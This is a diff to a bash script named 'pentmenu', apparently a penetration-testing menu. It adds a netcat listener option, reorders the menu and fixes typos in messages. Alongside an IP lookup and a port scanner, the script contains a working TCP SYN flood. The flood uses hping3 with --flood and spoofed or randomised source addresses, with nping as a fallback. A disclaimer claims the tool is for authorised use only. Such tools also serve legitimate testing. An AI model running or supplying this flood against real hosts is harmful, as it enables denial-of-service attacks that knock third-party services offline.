@@ -1,11 +1,47 @@
 #!/bin/bash
+## create listener function
+listener ()
+{ echo "Enter protocol, [t]cp (default) or [u]dp:"
+read PROTO
+: ${PROTO:=t}
+if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
+echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
+fi
+echo "Listing current listening ports on this system.  Do not attempt to create a listener on one of these ports, it will not work." && echo ""
+if test -f "/bin/ss"; then LISTPORT=ss; 
+else LISTPORT=netstat
+fi
+$LISTPORT -$PROTO -n -l 
+echo "Enter port number (defaults to 8000):"
+read PORT
+: ${PORT:=8000}
+if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
+PORT=8000 && echo "You provided a string, not a port number!  Reverting to port 8000"
+fi
+if [ "$PORT" -lt "1" ]; then
+PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
+elif [ "$PORT" -gt "65535" ]; then
+PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000" 
+else echo "Using netcat to create listener:"
+fi
+echo "Use ctrl c to stop"
+if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
+sudo netcat -k -l -v -p $PORT 
+elif  [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
+netcat -k -l -v -p $PORT 
+elif  [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
+sudo netcat -u -k -l -v -p $PORT 
+elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
+netcat -u -k -l -v -p $PORT 
+fi
+}
 ## create menu and show welcome message
 echo ""
-echo "Hell and welcome to pentmenu!"
-echo "This software is only for responsible, authorised used."
+echo "Hello and welcome to pentmenu!"
+echo "This software is only for responsible, authorised use."
 echo "YOU are responsible for your own actions!"
 echo ""
-options=("Show IP" "TCP SYN Flood" "TCP Port Scanner" "Quit")
+options=("Show IP" "TCP Port Scanner" "TCP SYN Flood" "Create Listener" "Quit")
 select opt in "${options[@]}"; do
 ## quit 
 	if [ "$opt" = "Quit" ]; then
@@ -13,13 +49,13 @@ select opt in "${options[@]}"; do
 	exit 0
 ## show external IP
 	elif [ "$opt" = "Show IP" ]; then
-	echo "External IP lookup requires curl..."
+	echo "External IP lookup uses curl..."
 	echo "External IP is detected as:"
 	curl http://canihazip.com/s/
 	echo ""
 ## TCP SYN Flood DOS
  	elif [ "$opt" = "TCP SYN Flood" ]; then
-	echo "TCP SYN Flood requires hping3...checking for hping3..."
+	echo "TCP SYN Flood uses hping3...checking for hping3..."
 	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
 ## No hping3 so using nping for TCP SYN Flood
 	else "hping3 not found :( trying nping instead"
@@ -39,9 +75,8 @@ select opt in "${options[@]}"; do
 	: ${TOTAL:=10000}
 	echo "Starting TCP SYN Flood..."
 	if 	[ "$SOURCE" = "i" ]; then
-	sleep 1
 	sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
-	else sleep 1 && sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+	else sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
 	fi
 	fi
 ## Or hping3 is found, so use that for TCP SYN Flood
@@ -54,33 +89,30 @@ select opt in "${options[@]}"; do
 	: ${SOURCE:=i}
 	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
 	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-	sleep 1
 	sudo hping3 --flood --spoof $SOURCE -p $PORT -S $TARGET
 	elif [ "$SOURCE" = "r" ]; then
 	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-	sleep 1
 	sudo hping3 --flood --rand-source -p $PORT -S $TARGET
 	elif [ "$SOURCE" = "i" ]; then
 	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-	sleep 1
 	sudo hping3 --flood -p $PORT -S $TARGET
 	else echo "Not a valid option!  Using interface IP"
 	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-	sleep 1
 	sudo hping3 --flood -p $PORT -S $TARGET
 	fi
 ## TCP SYN Port Scan using netcat
 	elif [ "$opt" = "TCP Port Scanner" ]; then
-	echo "TCP Port Scanner requires netcat..."
+	echo "TCP Port Scanner uses netcat..."
 	echo "Enter target"
 	read TARGET
 	echo "Enter target port (e.g. '80') or port range (e.g. '1-1000')"
 	read PORT
 	echo "Starting TCP Port Scan"
-	sleep 1
 		netcat -zv $TARGET $PORT
-	else
+	elif [ "$opt" = "Create Listener" ]; then
+	listener
 ## Default if no menu option selected is to return an error
+	else
   	echo  "That's not a valid option! Hit Return to show main menu"
 	fi
 done
